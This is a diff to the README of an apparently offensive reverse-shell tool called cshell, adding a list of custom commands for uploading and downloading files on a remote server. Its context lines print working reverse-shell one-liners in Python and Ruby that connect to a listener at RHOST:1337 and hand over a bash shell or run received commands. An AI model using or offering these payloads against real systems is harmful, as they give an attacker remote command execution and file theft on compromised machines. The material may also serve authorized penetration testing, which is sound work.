@@ -47,7 +47,15 @@ lstnr   Generate payload, copy it to your clipboard and start a listener[Optiona
 - **Generating a payload** :   
 	- `cshell lstnr -f <Format> -i <Interface or IP>  -p <Port> -f <Payload format>`  
   
-  
+
+### Custom Commands : 
+- `help` - Help menu of custom commands  
+- `clear` - Clear the screen  
+- `exit` - Exit the shell  
+- `upload` - Upload a file into the remote server  
+- `download` - Download a file from the remote server  
+
+
 ### Payloads  
 ```bash  
 $ cshell --payloads  
@@ -75,3 +83,5 @@ python3                         python3 -c 'import socket,subprocess,os;s=socket
 python3-export                  export RHOST="127.0.0.1";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")  
 ruby                            export RHOST=127.0.0.1;export RPORT=1337;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'  
 ```  
+
+
